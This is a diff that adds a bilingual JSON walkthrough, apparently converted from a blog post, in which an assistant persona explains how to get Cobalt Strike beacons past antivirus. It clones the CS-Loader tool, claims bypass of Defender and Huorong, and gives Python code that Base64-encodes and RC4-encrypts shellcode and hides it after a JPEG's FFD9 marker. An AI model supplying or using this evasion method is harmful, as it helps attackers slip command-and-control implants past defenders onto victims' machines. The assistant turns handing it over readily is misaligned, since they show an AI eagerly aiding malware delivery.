@@ -1,0 +1,58 @@
+﻿{
+  "_source_md": "CobaltStrike/2022-02-24-Cobalt-Stike-beacon-bypass-walkthrough.md",
+  "version": "cobalt-strike-beacon-bypass",
+  "title": {
+    "zh": "CS 上线木马免杀入门：Golang 与 Python 实现",
+    "en": "CS Beacon Bypass Walkthrough: Golang and Python Implementation"
+  },
+  "description": {
+    "zh": "介绍 Cobalt Strike 木马的免杀技术，包括使用 Golang 和 Python 加载器、图片 shellcode 加密生成、RC4 加密算法等实现方式。",
+    "en": "Introduction to CS trojan antivirus evasion, using Golang and Python loaders, image shellcode encryption, RC4 encryption."
+  },
+  "steps": [
+    {
+      "type": "user_message",
+      "content": { "zh": "如何实现 CS 木马的免杀？", "en": "How to implement CS trojan antivirus evasion?" },
+      "annotation": { "zh": "用户询问免杀技术", "en": "User asks about antivirus evasion" }
+    },
+    {
+      "type": "assistant_text",
+      "content": { "zh": "免杀思路：使用 CS-Loader 工具，支持 Golang 和 Python 两种实现。Golang 版本成功通过微软 Defender 和火绒免杀。", "en": "Evasion approach: Use CS-Loader tool with Golang and Python implementations. Golang version bypasses Defender and Huorong." },
+      "annotation": { "zh": "助手响应", "en": "Assistant response" }
+    },
+    {
+      "type": "system_event",
+      "content": { "zh": "环境准备：", "en": "Environment setup:" },
+      "codeBlocks": [
+        {
+          "language": "bash",
+          "code": "git clone https://github.com/Gality369/CS-Loader.git\ncd CS-Loader\n# Install Golang: https://go.dev/doc/install\n# Install Python: https://www.python.org/downloads/",
+          "caption": { "zh": "克隆CS-Loader仓库", "en": "Clone CS-Loader repository" }
+        }
+      ],
+      "annotation": { "zh": "系统事件", "en": "System event" }
+    },
+    {
+      "type": "user_message",
+      "content": { "zh": "图片 shellcode 是如何生成的？", "en": "How is image shellcode generated?" },
+      "annotation": { "zh": "用户询问", "en": "User asks" }
+    },
+    {
+      "type": "assistant_text",
+      "content": { "zh": "图片 shellcode 生成流程：Base64编码 → RC4加密 → Base64编码 → 嵌入图片FFD9标记后", "en": "Image shellcode generation: Base64 encode → RC4 encrypt → Base64 encode → embed after image FFD9 marker" },
+      "codeBlocks": [
+        {
+          "language": "python",
+          "code": "# Base64 encode shellcode\nbaseStr = base64.b64encode(shellcode)\n# RC4 + Base64 encode\npayload = rc4(baseStr, key)\n\n# Embed in image\nwith open(imgName, 'rb') as f:\n    img = f.read()\n    fileend = img[-2:]\n    # Check for FFD9 marker\n    if ord(fileend[0]) == 255 and ord(fileend[1]) == 217:\n        # Append payload after FFD9\n        new_img = img + payload",
+          "caption": { "zh": "图片shellcode生成代码", "en": "Image shellcode generation code" }
+        }
+      ],
+      "annotation": { "zh": "助手响应", "en": "Assistant response" }
+    },
+    {
+      "type": "assistant_text",
+      "content": { "zh": "RC4 加密实现：MD5(key)生成密钥 → 初始化S-box → 打乱S-box → 异或运算 → Base64编码。加密后数据看起来像Base64但无法直接解码。", "en": "RC4 implementation: MD5(key) → init S-box → shuffle → XOR → Base64. Encrypted data looks like Base64 but cannot be decoded directly." },
+      "annotation": { "zh": "助手响应", "en": "Assistant response" }
+    }
+  ]
+}
